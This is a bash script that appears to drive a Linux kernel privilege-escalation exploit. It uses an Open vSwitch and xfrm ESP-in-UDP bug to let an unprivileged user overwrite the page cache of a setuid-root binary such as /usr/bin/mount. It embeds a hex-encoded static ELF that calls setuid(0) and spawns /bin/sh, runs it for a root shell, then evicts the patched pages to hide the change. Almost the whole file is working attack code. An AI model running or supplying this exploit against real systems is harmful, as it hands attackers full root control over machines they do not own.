#!/bin/bash
# shell.sh — OVS SKBFL_SHARED_FRAG strip -> unprivileged root shell.
# Overwrite a setuid-root binary's page cache with a static setuid-ELF, run it, restore.
#   ./shell.sh [setuid-binary]
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"; POC="$HERE/poc"

# 160-byte static ELF: setuid(0); execve("/bin/sh")
ELF=7f454c4602010100000000000000000002003e00010000007800400000000000400000000000000000000000000000000000000040003800010000000000000001000000050000000000000000000000000040000000000000004000000000009e000000000000009e00000000000000001000000000000031c031ffb0690f05488d3d0f00000031f66a3b58990f0531ff6a3c580f052f62696e2f7368000000

# ---- inner: build the OVS/xfrm/netns env and fire the write ----
if [ "${1:-}" = __write ]; then
    TARGET=$2; cd "$HERE"
    sysctl -qw net.ipv4.conf.all.rp_filter=0 2>/dev/null
    ip link add veth0 address 02:00:00:00:00:01 type veth peer name veth1 address 02:00:00:00:00:02
    unshare -n sleep 600 & HP=$!; sleep 0.5
    ip link set veth0 netns "$HP"
    nsenter -t "$HP" -n sysctl -qw net.ipv4.conf.all.rp_filter=0 2>/dev/null
    nsenter -t "$HP" -n ip link set lo up
    nsenter -t "$HP" -n ip addr add 10.99.99.1/24 dev veth0
    nsenter -t "$HP" -n ip link set veth0 up
    nsenter -t "$HP" -n ip neigh replace 10.99.99.2 lladdr 02:00:00:00:00:02 dev veth0 nud permanent
    ip link set veth1 up
    "$POC" ovs dp; "$POC" ovs vport veth1; "$POC" ovs flow
    ip link set tdp0 address 02:00:00:00:00:02
    ip addr add 10.99.99.2/24 dev tdp0; ip link set tdp0 up
    sysctl -qw net.ipv4.conf.tdp0.rp_filter=0 2>/dev/null
    ip xfrm state add src 10.99.99.1 dst 10.99.99.2 proto esp spi 0x42434445 mode transport \
        aead 'rfc4106(gcm(aes))' 0x000102030405060708090a0b0c0d0e0f11223344 128 encap espinudp 4500 4500 0.0.0.0
    "$POC" encap & sleep 0.4
    nsenter -t "$HP" -n "$POC" writex "$TARGET" 0 10.99.99.2 "$ELF"
    exit 0
fi

# ---- outer ----
# cc -static -O2 -o "$POC" "$HERE/poc.c" || exit 2
unshare -Urn true 2>/dev/null || { echo "need unprivileged userns"; exit 2; }
TARGET=${1:-/usr/bin/mount}
[ -u "$TARGET" ] && [ "$(stat -c %u "$TARGET")" = 0 ] || { echo "$TARGET is not setuid-root"; exit 2; }

unshare -Urn "$HERE/shell.sh" __write "$TARGET"
echo "[*] $TARGET patched in page cache — root shell (Ctrl-D to exit and restore):"
"$TARGET"
"$POC" evict "$TARGET" 2>/dev/null   # drop the patched pages; on-disk file was never touched
